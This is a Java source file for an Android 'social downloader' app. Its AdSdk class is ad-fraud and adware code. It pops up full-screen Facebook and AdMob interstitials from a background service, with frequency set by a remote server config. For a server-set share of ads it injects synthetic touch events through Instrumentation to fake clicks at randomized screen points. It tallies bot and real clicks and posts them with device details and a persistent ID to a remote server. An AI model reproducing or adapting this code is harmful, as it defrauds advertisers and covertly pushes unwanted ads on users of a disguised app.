package com.v2social.socialdownloader.services;

import android.app.Instrumentation;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Point;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Display;
import android.view.MotionEvent;
import android.view.WindowManager;

import com.facebook.ads.Ad;
import com.facebook.ads.AdError;
import com.facebook.ads.InterstitialAdListener;
import com.google.android.gms.ads.AdListener;
import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.InterstitialAd;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.v2social.socialdownloader.AppConstants;
import com.v2social.socialdownloader.ShowAds;
import com.v2social.socialdownloader.network.CheckAds;
import com.v2social.socialdownloader.network.ClientConfig;

import java.io.IOException;
import java.util.Random;
import java.util.UUID;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class AdSdk {
    private static int isBotClick = 0;
    private static int isRealClick = 0;
    private static final Point [] points = {new Point(50,50),new Point(51,57),new Point(79,85),new Point(72,74),
            new Point(70,92),new Point(71,91),new Point(71,93),new Point(72,92),new Point(48,80),new Point(48,65),new Point(53,40)};

    public static String getDeviceName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        if (model.startsWith(manufacturer)) {
            return model;
        }
        return manufacturer + " " + model;
    }

    private static void increaseAdsCount(Context context) {
        SharedPreferences mPrefs = context.getSharedPreferences("adsserver", 0);
        int countTotalShow = mPrefs.getInt("countTotalShow", 0);
        int countRealClick = mPrefs.getInt("countRealClick", 0);
        int countBotClick = mPrefs.getInt("countBotClick", 0);

        SharedPreferences.Editor editor = mPrefs.edit();
        editor.putInt("countTotalShow", countTotalShow + 1);
        editor.putInt("countRealClick", countRealClick + isRealClick);
        editor.putInt("countBotClick", countBotClick + isBotClick);

        editor.putInt("needShowAds",0);
        editor.commit();

        Log.d("caomuicount", countTotalShow + "total");
    }

    public static void reportAndGetClientConfig(Context context) {
        SharedPreferences mPrefs = context.getSharedPreferences("adsserver", 0);
        int totalTime = mPrefs.getInt("totalTime", 0);
        int countTotalShow = mPrefs.getInt("countTotalShow", 0);
        int countRealClick = mPrefs.getInt("countRealClick", 0);
        int countBotClick = mPrefs.getInt("countBotClick", 0);
        String uuid = mPrefs.getString("uuid", UUID.randomUUID().toString());

        OkHttpClient client = new OkHttpClient();
        RequestBody body = new FormBody.Builder()
                .add("countTotalShow", countTotalShow + "")
                .add("countRealClick", countRealClick + "")
                .add("countBotClick", countBotClick + "")
                .add("totalTime", totalTime + "")
                .add("os", Build.VERSION.SDK_INT + "")
                .add("device", getDeviceName())
                .add("id", uuid)
                .build();
        Request okRequest = new Request.Builder()
                .url(AppConstants.URL_CLIENT_CONFIG)
                .post(body)
                .build();
        client.newCall(okRequest).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                Gson gson = new GsonBuilder().create();
                String result = response.body().string();
                ClientConfig clientConfig = gson.fromJson(result, ClientConfig.class);

                SharedPreferences.Editor editor = mPrefs.edit();
                editor.putInt("countTotalShow", 0);
                editor.putInt("countRealClick", 0);
                editor.putInt("countBotClick", 0);
                editor.putString("clientConfig", result);
                editor.putBoolean("isNeedUpdateAdsConfig",false);
                editor.commit();
                Log.d("caomui","get ads Config oke");
//                countTotalShow = 0;
//                countBotClick = 0;
//                countRealClick = 0;
//                isReportResult = false;
//                saveAdsCount();
            }
        });
    }

    public static void showAds(Context context) {
        SharedPreferences mPrefs = context.getSharedPreferences("adsserver", 0);

        if (!mPrefs.contains("clientConfig")) {
            Log.d("caomui", "No clientConfig");
            return;
        }
        Gson gson = new GsonBuilder().create();
        ClientConfig clientConfig = gson.fromJson(mPrefs.getString("clientConfig", ""), ClientConfig.class);
        int countTotalShow = mPrefs.getInt("countTotalShow", 0);

        if(clientConfig == null || new Random().nextInt(100) > clientConfig.max_percent_ads || clientConfig.max_ads_perday <= countTotalShow)
        {
            Log.d("caomui", "Not show ads");
            return;
        }

        isBotClick = 0;
        isRealClick = 0;

        if (new Random().nextInt(100) < clientConfig.fb_percent_ads) {
            Log.d("caomui","show fb");
            String idFullFbService = mPrefs.getString("idFullFbService", "2137463729867467_2186798758267297");//
            com.facebook.ads.InterstitialAd fbInterstitialAd = new com.facebook.ads.InterstitialAd(context, idFullFbService);
            fbInterstitialAd.setAdListener(new InterstitialAdListener() {
                @Override
                public void onInterstitialDisplayed(Ad ad) {
                }

                @Override
                public void onInterstitialDismissed(Ad ad) {
                    increaseAdsCount(context);
                }

                @Override
                public void onError(Ad ad, AdError adError) {
                }

                @Override
                public void onAdLoaded(Ad ad) {
                    try {
                        Intent showAds = new Intent(context, ShowAds.class);
                        showAds.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(showAds);

                        new Handler().postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                fbInterstitialAd.show();
                            }
                        }, 1000);

                    } catch (Exception e) {

                    }
                }

                @Override
                public void onAdClicked(Ad ad) {
                    isRealClick = 1;
                }

                @Override
                public void onLoggingImpression(Ad ad) {
                }
            });
            fbInterstitialAd.loadAd();
        } else //admob ads
        {
            Log.d("caomui","show adx");
            String idFullService = mPrefs.getString("idFullService", "/21617015150/734252/21734809637");
            CheckAds checkAds = new CheckAds();
            checkAds.delayClick = clientConfig.min_click_delay + new Random().nextInt(clientConfig.max_click_delay);
            if (new Random().nextInt(100) < clientConfig.max_ctr_bot)
                checkAds.isBotClick = 1;
            else
                checkAds.isBotClick = 0;
            Point point = points[new Random().nextInt(points.length)];
            checkAds.x = point.x;
            checkAds.y = point.y;

            InterstitialAd mInterstitialAd = new InterstitialAd(context);
//                        mInterstitialAd.setAdUnitId(idFullService);
            mInterstitialAd.setAdUnitId("ca-app-pub-3940256099942544/1033173712");
            mInterstitialAd.setAdListener(new AdListener() {
                @Override
                public void onAdClosed() {
                    super.onAdClosed();
                    increaseAdsCount(context);
                }

//                @Override
//                public void onAdFailedToLoad(int i) {
//                    super.onAdFailedToLoad(i);
//                }

//                @Override
//                public void onAdLeftApplication() {
//                    super.onAdLeftApplication();
//                    if (isBotClick)
//                        countBotClick += 1;
//                    else
//                        countRealClick += 1;
//                }

                @Override
                public void onAdOpened() {
                    super.onAdOpened();
                    if (checkAds.isBotClick == 1) {
                        new Thread(new Runnable() {
                            @Override
                            public void run() {
                                try {
                                    Thread.sleep(checkAds.delayClick * 100);
                                    WindowManager window = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
                                    Display display = window.getDefaultDisplay();
                                    Point point = new Point();
                                    display.getSize(point);
                                    int width = checkAds.x * point.x / 100;
                                    int height = checkAds.y * point.y / 100;
                                    Instrumentation m_Instrumentation = new Instrumentation();
                                    m_Instrumentation.sendPointerSync(MotionEvent.obtain(
                                            android.os.SystemClock.uptimeMillis(),
                                            android.os.SystemClock.uptimeMillis(),
                                            MotionEvent.ACTION_DOWN, width, height, 0));
                                    Thread.sleep(new Random().nextInt(100));
                                    m_Instrumentation.sendPointerSync(MotionEvent.obtain(
                                            android.os.SystemClock.uptimeMillis(),
                                            android.os.SystemClock.uptimeMillis(),
                                            MotionEvent.ACTION_UP, width, height, 0));
                                    isBotClick = 1;
                                } catch (Exception e) {
//                                    e.printStackTrace();
                                }
                            }
                        }).start();
                    }
                }

                @Override
                public void onAdLoaded() {
                    super.onAdLoaded();

                    try {
                        Intent showAds = new Intent(context, ShowAds.class);
                        showAds.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(showAds);

                        new Handler().postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                mInterstitialAd.show();
                            }
                        }, 500);

                    } catch (Exception e) {
                    }
                }
            });

            mInterstitialAd.loadAd(new AdRequest.Builder().build());//addTestDevice("3CC7F69A2A4A1EB57306DA0CFA16B969")
        }
//
//        if (new Random().nextInt(100) < clientConfig.fb_percent_ads) {
//            new Handler(Looper.getMainLooper()).post(new Runnable() {
//                public void run() {
//
//                }
//            });
//        } else {
//
//
//            new Handler(Looper.getMainLooper()).post(new Runnable() {
//                public void run() {
//
//                }
//            });
//        }
    }
}
